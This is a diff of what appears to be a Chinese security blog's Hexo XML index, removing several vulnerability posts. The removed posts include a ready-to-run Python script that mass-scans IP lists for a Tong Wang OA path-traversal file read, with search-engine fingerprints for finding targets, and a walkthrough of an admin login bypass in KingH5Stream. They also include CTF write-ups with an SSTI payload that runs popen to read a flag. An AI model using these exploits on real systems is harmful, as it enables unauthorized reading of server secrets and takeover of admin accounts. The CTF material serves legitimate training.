@@ -157,105 +157,6 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>Tong Wang OA tooneAssistantAttachement File read</title>
-    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
-    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
-<p>​
-同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
-<ul>
-<li>Fofa：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li>Hunter：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li>Quake：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<h4 id="利用脚本">利用脚本</h4>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>KingH5Stream admin login</title>
-    <url>/2024/11/08/beijignyakongkeyijifazhanyouxiangongsi/</url>
-    <content><![CDATA[<h2 id="漏洞位置">漏洞位置：</h2>
-<p>/#/login</p>
-<h2 id="漏洞描述">漏洞描述</h2>
-<p>北京亚控科技发展有限公司是一家工业自动化和信息化软件平台高科技企业。
-北京亚控科技发展有限公司KingH5Stream系统存在逻辑缺陷漏洞，攻击者可利用该漏洞登录管理员账户。</p>
-<h2 id="利用过程">利用过程</h2>
-<p>进入登陆界面： <img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d8c77d29ded1a8ce47ba3.png"
-                     
-alt="image.png" 
-                ></p>
-<p>用户名admin，密码随便填</p>
-<p>请求包： <img 
-
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d8c9bd29ded1a8ce49ab9.png"
-                     
-alt="image.png" 
-                ></p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d8cbad29ded1a8ce4cbfd.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>修改bStatus和strSession参数，将前者改为true，后者填个1，直接放包
-发现放包后系统请求了另一个包</p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d8ce8d29ded1a8ce4ebaa.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>那串hash值应该就是管理员密码hash值，解不解出来无所谓，放包之后直接进入系统</p>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2024-9076 dedecms命令注入漏洞复现</title>
     <url>/2024/11/13/dedecms_CVE-2024-9076/</url>
     <content><![CDATA[<blockquote>
@@ -301,32 +202,6 @@ alt="image.png"
       </tags>
   </entry>
   <entry>
-    <title>ezEIP Upload RCE</title>
-    <url>/2024/11/08/DVB-2023-4987/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="497b095794d9304f221dd42a1593369c5f11cc356a12d1095141c21fdfac5b22">11f05ec438d0ff2a949da9113ef4898ba65555396aa4fa8b9c5ba3970e51640ebb8f04193d34b093c073b47ba4dca48064e6df8d691b9d1c32d2a98ac388cd371cdc9050f38c38a71260e4f93b144337ab451ee47c410254ce630d9af922a700e77316f4beb978db18fddcd53274c8450c123d2335456a4d158b4ca3b0493e93c23e55646268a09879166f4c9360892391af277ef9d443d213cdfd86c67b607a3d79ad7f91c946d4bb71634b9972b52a050af2c84893a36507a6f6015e49a625ce6c2c3bca7820a1ef140b621d797b53f48ca0ace186eb69397645d2bca0133cd15bc9aa7e10a56be071e444dd820c480d7b252e10eec2b8577e00657a84f33918033b089b16f0851a0ebe8a0be26e95ee3bc8570a29f9305dab6e647e8174641ce70f2951cf70664fcc706c389a94f1b9900963aff3e074d2fb44c07ca298a8b9f3ba507566d8fb4674fa7a744ee86c22e7ebc0507eb5297db13db2181ef96cc1ff628a41fc1cab772dce5096764fcf4ffec1dd4caacc2b4d8c816413a4cbfe83192f15510f02e3beb04be96cd7d859db00cbed9076a7d3cf2c1a9bed454afa15735fafccc8e52768a80ea4d724e1d3ce5fd4844ec4b65a1af3f08fe9f95dec13111d1236f9bbeda981c2683a17232a23a88f9b1541e0009b9b69a1061e276a0f93c2f763e87b6406645ca350fb27de712c24c2005658ed3db59a56a23d2474d921e0bee79ec99879e611ca539463e933c492c1d13384b9c775527771169d6fd789ca1cff354bf85cf768fe9dbb2c848a69ef36b07a48a07c131e15bccb927517a1e5293037435531891cf5c1e36f92d49383e12c6f69c7449c7c677d255d9e6f1e223a821e5ea6c63cbbc68433f7e60aeacca64f11eb91dc45112e4a94126403bb75be6b75a094f292478bb3407d6d7df3ecaed4f85d025523272f8e129a26f8a5c8a0ee64b1ebb721c2e9460dbca3ec7dcbf1d9aa196a0bff46f0d7506073fe470c85b5e9852e2f0633db3970927888b92a1e00bb32031231f92774ee2646ff816d043dbfa6550fe3aadd5c0397f6d6eb34aae42eeb03e74858ca02e8a90550975fdf4eeb8a9e54e8c81bb5944a2788f16765824459700f1346b605cde33545138a8669bd5210b52d6d3aede14f51b5437ee475dde98b0cea0973250993f9d663d12c1263f76e1c8b19836e1bfce81cee4f5c67c58165d2e1bb900f72ac7993f13200c9eab57229ab15128bd43adb7189bb978aeb2ae7cd6e79623851adff262de1cce524ec8a54c04269fb78c4a25a2493800b9657728cfe13e851f7654eb26103bd73fe55d02d4877d35302dec94aca25f7651ae449cdb0ac4b236f65a2e16e6f5995ebfb06184a9f9fa77f192d5219398fb06c57496112cdee561063eb1fd6ccb594a92cc3fcb35055e4782257a39f3b9790978dbf473aef1757d4398bd9ba142afe8354f9f250eb0b10a1c7aa61546728f671a53d94dafa2e81fca3053a5cf68eb68cfafe81d9a85e55e29353a5d19fef49edadb23a81f583d5ba6935f15fdb6a9c4c4aa38d883b43b8e25bacfe2baa15eda5098f8186b35f71f08e8f9bf04289dfa790f10ac9251c674c296732e28ff70756f42069001843dc9df68f215cebdc9891b22593427bd1d25c2cdcdb9a5cad40829a8db8621d548398a5f2d2a89001533df4ba092e0cfa871f4ee2323ee00a4a0a1db84c478320d19cd834d6f855baf3cb34ef0e57f4ae25f2718bd710fd31f1a801d18132e51ce8384778b895639cd047084bd0d777fc5b11d3a5aacb2452099f4881add9edf9bf79cab9d9ecc32d3dea96c5a585b21e0fe1f67ee4a03e98f9c1a6f5f12af543ac62f295e481f4e473c8c06dd76ddb7394bc95044e5416042dd02a80a388f16723067be4d2d89fa90a62c918abb52966fcbc61a77f9fca79ed2e1de9510b38f663305b9ef11a7b89dc52412dbdcf7206f48e721c3f9f68d24c933981dc170b9220cdd9ec6e16ef25a5b014b6954f0760ec740807026186b3156ff168bc9a323ef7564bc7dbd82c7e9fb66f4dc9ef9c4704118c8022006170da16566e7dd1d868e2717fb20ecaec7dac3eaccf2470de4364716b5404b07deb950a9f239cd0a9c6c56dc0a9b1772b28ec260a42093d9583619f133089548a0ebb626c01726f2e8f5c325f460421d761a4baecc895eab544152174691e12576511efe33ed84b5520bc2beaf02ac65d5d29982fd4494efd472b18bc1b3beef4799eb2982de508129869b457ca5a74210f4d4bebc483ee4f246fbda3d5574da15cbe210054a81558e97e38b16c1f3b1c3156b61425fa4902b664e388f1ba7f4aa7fcb23fa64e793cc96a1b0f736daf7fe1e41717358b6a710f14b8e91e1b8f93063ad79bb65b9f526a045073ce5e8e44523ef90eeb93502315a276e998b733a49f24431ef0b632d17f27d05d653a5d7b0db723b77f04db41fce4c226a390bb2dfba12c81ba96984c40f77935694829ead7a09e5f0d367fb4b2619925f457b6ee084f2b0d27a256df9336da7957f37cf5597a0e446be7dd35378470aa0612bea76208e2372191b19c8178fdd384fb06073d79348f44c8fc94365a68f773d90dcd12f9d9024a592b01fd23b0165d7ed0cf2faa23d6f5c72400f7422feece1d8c210bef54aa0fc355464ce310517fe32d3998f362142ee7fcc649fc8fa5208e6a8bf8704a10b382fd9d3379058b8c26d0b7cdf65cde4175433cebd72340da3e35710c51920968de03b14ed55573037b67c473266e4997a18110efa73f4b3c88b4231b6d7d2669aaebb8d4295588fcab88d180f7a12204049b5bc023cda44418dbd2cc855634f7af4d3d8d35d42c6276fadb1e3071da473115ce8129a2fdd6aa686c0408e1b19baa16179d5d28a1732ae88c6f523120070d6f7dbf0d6c4f71752441d113aaf9d0ee0b9280913076ad28097155083794496d48faa7f7c6519f9937b7d76b019c2b0d1f14695086e867e9cc5164797711781df7da874125e72c39d08d6cf4640d12b30f0c236bb0af36a0f5e9eee38697242353dff033c1a4c69b60e38587035d5c9610cefa2c4d2ac368505c3e34706ecebbc8ee6e558f44af93bfd6fea9ce0203778ed430eab9b17694d59aa222ec0ff9ac1298cc92ffdea87e5519f0547595a567f46c3d7c3608440d90517a20e35c0f8939dd04318bda92e5463627daa935e5f0b7b2ae34f0e88ba615ba6fb18cb56bf1f5f0bc427e0e2715edc3a59a08e271a5bdb811e5f78d30256771666c9b1997a8cb4182bd91c81aa11fbba50937285ac11a8d4c55e9f51aad3f533968b541ae3fe11050c92882fa</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
-<script data-swup-reload-script type="module">
-import {initHBE} from "/js/plugins/hbe.js";
-  console.log("hexo-blog-encrypt: loaded.");
-    initHBE();
-</script>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>逆向值定位</title>
     <url>/2024/11/07/js_nixiang_1/</url>
     <content><![CDATA[<h2 id="思路">思路</h2>
@@ -348,23 +223,6 @@ import {initHBE} from "/js/plugins/hbe.js";
 ]]></content>
       <tags>
         <tag>JS逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>鹏城杯2024-python口算</title>
-    <url>/2024/11/09/pcb2024-python-calc/</url>
-    <content><![CDATA[<p>队友yeepie师傅做出来的，队友yeepie师傅做出来的，队友yeepie师傅做出来的</p>
-<p>我是搬运我是搬运我是搬运</p>
-<h2 id="python口算">python口算</h2>
-<p>1秒内计算算式，从页面中获取到乘法算式，很常见的题目，正则python发包，gpt一句话的事</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">tokens = re.findall(<span class="string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>.join(tokens))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">res = requests.get(url + <span class="string">&quot;/calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;抓取到的算式:&quot;</span>, res.text)</span><br><span class="line">result = calculate_expression(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算结果:&quot;</span>, result)</span><br><span class="line">submit_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">response_get = requests.get(submit_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET 请求返回的响应页面：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_get.text)</span><br></pre></td></tr></table></figure></div>
-<p>成功 返回/static/f4dd790b-bc4e-48de-b717-903d433c597f</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-<p>ssti打即可</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">是ssti 过滤了空格，$&#123;IFS&#125;绕过即可拿到flag</span><br><span class="line">notadmin-pcb2024</span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">tokens = re.findall(<span class="string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>.join(tokens))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">res = requests.get(url + <span class="string">&quot;/calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;抓取到的算式:&quot;</span>, res.text)</span><br><span class="line">result = calculate_expression(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算结果:&quot;</span>, result)</span><br><span class="line">submit_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">response_get = requests.get(submit_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET 请求返回的响应页面：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_get.text)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()</span></span><br><span class="line"><span class="string">[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat$&#123;IFS&#125;/flag&#x27;).read()&#125;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">response_post = requests.post(submit_url, data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提交后的响应页面（POST）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_post.text)</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <tags>
-        <tag>竞赛复盘</tag>
       </tags>
   </entry>
   <entry>
@@ -393,106 +251,6 @@ alt="image.png"
 <p>危险函数黑名单，有时候想不明白从哪打漏洞点就可以从黑名单处逆推。上面的代码可以看出来校验的是sessionData，这玩意又明文传输，往这里打没跑了，更别提最上面还有个带eval的类：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <p>因为filterSensitiveFunctions()中进行了置空，所以直接从session里打反序列化逃逸触发notouchitsclass类再双写绕过即可</p>
-]]></content>
-      <tags>
-        <tag>竞赛复盘</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯2024-PyBlockly</title>
-    <url>/2024/11/08/qiangwangbei2024pyblockly/</url>
-    <content><![CDATA[<p>给源码的一道python题</p>
-<p>从程序入口开始看起：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br></pre></td></tr></table></figure></div>
-<p>只给了两个路由，那数据肯定是提交给了后者哇。仔细看看后者的处理逻辑就行。</p>
-<p>首先从请求中把咱们所提交的数据提取出来，然后在try里调用<strong>json_to_python()</strong>函数，查看请求包格式，抓一个print(0)的包：</p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d7928d29ded1a8cd06d60.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>跟踪下看看函数逻辑：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> python_code</span><br></pre></td></tr></table></figure></div>
-<p>从咱们提交的数据里去提取下一级的blocks里的下一级的blocks中的第0位元素，也就是</p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d79c3d29ded1a8cd13678.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>提取完这个数据之后，又调用了<strong>block_to_python()</strong>这个函数，跟进查看：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line">           </span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():      </span><br><span class="line">            code =  <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">            code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line">        </span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        code +=<span class="string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code </span><br><span class="line">    <span class="keyword">return</span> code</span><br></pre></td></tr></table></figure></div>
-<p>这个函数的话就是对咱们刚才所提取出来的type值进行if-elif-else的分析，以刚才传进来的数据包为例，如果传进来的类型为print时，定位到其中的文本域：</p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d79e1d29ded1a8cd154bc.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>然后这块挺有意思的哈，他又调用了一次<strong>block_to_python()</strong>，也就是又进行了一次提取，但这次的域已经不是原来的域了：</p>
-<p>原来的域：</p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d7a57d29ded1a8cd1d2a0.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>现在的域：</p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d7a97d29ded1a8cd21fc0.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>这个时候再去定位提取type时提取到的就不是print而是math_number,后续就正常进行拼接命令输出，不过这里不是关键点，所以不深入跟踪。</p>
-<p>真正关键的是这段：</p>
